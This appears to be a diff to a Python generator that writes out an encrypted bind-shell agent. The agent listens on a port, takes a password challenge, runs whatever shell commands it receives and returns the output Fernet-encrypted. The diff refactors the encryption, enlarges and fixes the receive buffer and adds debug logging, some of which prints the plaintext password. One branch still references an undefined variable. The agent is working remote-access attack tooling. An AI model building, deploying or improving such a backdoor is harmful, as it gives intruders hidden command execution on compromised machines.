@@ -5,87 +5,86 @@ import sys
 def writeAgent(output, rhost, rport, password):
 
     agent  = '''
+
 import os
+import sys
 import socket
 import base64
 import hashlib
+import logging
 import threading
 import subprocess
 from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+def generate_key(password):
+    """Generate fernet key from password"""
+
+    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
+    digest.update(password.encode())
+    key = base64.urlsafe_b64encode(digest.finalize())
+
+    return key
+
+def encrypt_file(password, infile, outfile):
+    """Encrypt file"""
+
+    try:
+
+        fernet = Fernet(generate_key(password))
+
+        with open(infile, 'rb') as fileStream:
+            plainData = fileStream.read()
+
+        with open(outfile, 'wb') as fileStream:
+
+            encrypted = fernet.encrypt(plainData)
+            fileStream.write(encrypted)
+            
+    except Exception as error:
+        logging.warning(error)
 
 
-
-class Crypto():
-    """Simple class to perform encryption and decryption with Fernet. Initialize with crypto = Crypto('password')"""
-
-    def __init__(self, password):
+def encrypt_message(password, message):
+    """Encrypt a message with str type and return message as str encrypted"""
     
-        self.password = password.encode()
-        digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
-        digest.update(self.password)
+    fernet = Fernet(generate_key(password))
 
-        self.key = base64.urlsafe_b64encode(digest.finalize())
+    message = message.encode()
+    encrypted = fernet.encrypt(message)
 
-        self.fernet = Fernet(self.key)
-
-
-    def encrypt_file(self, infile, outfile):
-        """Encrypt file"""
-
-        try:
-
-            with open(infile, 'rb') as fileStream:
-                plainData = fileStream.read()
-
-            with open(outfile, 'wb') as fileStream:
-
-                encrypted = self.fernet.encrypt(plainData)
-                fileStream.write(encrypted)
-                
-        except Exception as error:
-            print(error)
-
-
-    def encrypt_message(self, message):
-        """Encrypt simple message which will be return a string and not bytes"""
-        
-        message = message.encode()
-        encrypted = self.fernet.encrypt(message)
-
-        return encrypted.decode()
-        
-    def decrypt_file(self, infile, outfile):
-        """Encrypt file"""
-
-        try:
-
-            with open(infile, 'rb') as fileStream:
-                cipherData = fileStream.read()
-
-            with open(outfile, 'wb') as fileStream:
-
-                decrypted = self.fernet.decrypt(cipherData)
-                fileStream.write(decrypted)
-                
-        except Exception as error:
-            print(error)
-
+    return encrypted.decode()
     
-    def decrypt_message(self, message):
-        """Decrypt simple message which will be return a string and not bytes"""
+def decrypt_file(password, infile, outfile):
+    """Encrypt file"""
 
-        message = message.encode()
-        decrypted = self.fernet.decrypt(message)
+    try:
 
-        return decrypted.decode()
+        fernet = Fernet(generate_key(password))
 
-    def debug(self):
-        """Function to print password and generated key"""
-        
-        print(self.password.decode())
-        print(self.key.decode())
+        with open(infile, 'rb') as fileStream:
+            cipherData = fileStream.read()
+
+        with open(outfile, 'wb') as fileStream:
+
+            decrypted = fernet.decrypt(cipherData)
+            fileStream.write(decrypted)
+            
+    except Exception as error:
+        logging.warning(error)
+
+
+def decrypt_message(password, message):
+    """Decrypt a message with str type and return message as str decrypted"""
+
+    fernet = Fernet(generate_key(password))
+
+    message = message.encode()
+    decrypted = fernet.decrypt(message)
+
+    return decrypted.decode()
 
 
 
@@ -115,12 +114,12 @@ def passwordChallenge(channel, passwd):
         channel.close()
         challenge = False
 
-    return challenge
+    return challenge, hashPassword
 
 
 def serverHandler(channel, password):
 
-    crypto = Crypto(password)
+    #crypto = Crypto(password)
 
 
     # Loop on socket.recv
@@ -129,14 +128,21 @@ def serverHandler(channel, password):
         try:
             # Define buffer size, can be increased
             bufferSize = BUFFER_SIZE
+            rawRequest, tempBuffer = b'', b''
             
             # While loop to complete socket buffer in recv 
             while True:
-                rawRequest = channel.recv(bufferSize)
-                if len(rawRequest) < bufferSize:
+                tempBuffer = channel.recv(bufferSize)
+                rawRequest += tempBuffer
+                if len(tempBuffer) < bufferSize:
                     break
             # Decode bytes to str
-            clientRequest = rawRequest.decode()
+            clientRequestEncrypted = rawRequest.decode()
+            clientRequest = decrypt_message(password, clientRequestEncrypted)
+            logging.debug(f"RECV ENCRYPTED : {{clientRequestEncrypted}}")
+            logging.debug(f"RECV DECRYPTED : {{clientRequest}}")
+    
+# ------------------------------- Py314 REQUEST PARSING -------------------------------
 
             # If 'cd' command send
             if clientRequest.split(' ')[0] == 'cd':
@@ -146,28 +152,35 @@ def serverHandler(channel, password):
                     # Return empty output, to not block the remote shell
                     output = ' '
                 else:
-                    output = crypto.encrypt_message(f"{{workingDir}} doesn'nt exist")
+                    output = f"{{workingDir}} doesn'nt exist"
 
-                channel.sendall(output.encode())
-
+            # If check alive
             elif clientRequest == 'alive ?':
-                response = crypto.encrypt_message("alive !")
+                output  = "alive !"
                 channel.sendall(reponse.encode())
             
             # Else execute shell command
             else:
                 workingDir = os.getcwd()
                 output = shellCommand(clientRequest, workingDir)
-                output = crypto.encrypt_message(output)
-                channel.sendall(output.encode())
+            
+# ---------------------------- SEND TO Py314 ----------------------------
+
+            logging.debug(f"SEND RAW : \\n{{output}}")
+            logging.debug(f"SEND ENCRYPT : \\n{{encrypt_message(password, output)}}")
+            encryptedOutput = encrypt_message(password, output)
+            channel.sendall(encryptedOutput.encode())
+
+
 
         except KeyboardInterrupt:
             channel.close()
             exit()
 
         except Exception as error:
-            print(f"[!] {{error}}")
+            logging.warning(f"{{error}}")
             exit()
+
     
 
 
@@ -210,12 +223,22 @@ def shellCommand(command, cwd):
 # ------------------------------------------------------------------------------
 # ------------------------------------------------------------------------------
 
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 4096
+
+if len(sys.argv) > 1:
+    verbose = sys.argv[1]
+    if verbose == '-v':
+        level = logging.INFO
+    elif verbose == '-vv':
+        level = logging.DEBUG
+
+    logging.basicConfig(level=level, format='[%(asctime)s]-[%(levelname)s] : %(message)s', datefmt='%H:%M:%S')
+
 
 bindPort = {}
 bindAddress = '{}'
 password = '{}'
-
+ciperPassword = hashlib.sha512(password.encode()).hexdigest()
 
 serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -223,18 +246,26 @@ serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 serverSocket.bind((bindAddress, bindPort))
 serverSocket.listen(5)
 
-print(f"[?] Listening on {{bindAddress}}:{{bindPort}}")
+logging.info(f"Listening on {{bindAddress}}:{{bindPort}}")
 
 while True:
 
     try:
 
         channel, cliAddress = serverSocket.accept()
-        print(f"[+] Received Connection from {{cliAddress[0]}}")
-        challenge = passwordChallenge(channel, password)
+        logging.info(f"Received Connection from {{cliAddress[0]}}")
+        challenge, receivedHash = passwordChallenge(channel, password)
         if challenge is True:
+            logging.debug(f'Successfull password challenge with : ')
+            logging.debug(f'SHA512 excepted > {{ciperPassword}}')
+            logging.debug(f'SHA512 received > {{receivedHash}}')
             serverHandler(channel, password)
         elif challenge is False:
+            logging.debug(f'Password challenge failed with :')
+            logging.debug(f'Password > {{password}}')
+            logging.debug(f'SHA512 excepted > {{ciperPassword}}')
+            logging.debug(f'SHA512 received > {{receivedHash}}')
+
             channel.close()
 
 
@@ -244,9 +275,11 @@ while True:
         
         
     except Exception as error:
-        print(f"[!] {{error}}")
+        logging.warning(f"{{error}}")
         serverSocket.close()
         exit()
+
+ 
 
     '''.format(
         rport,
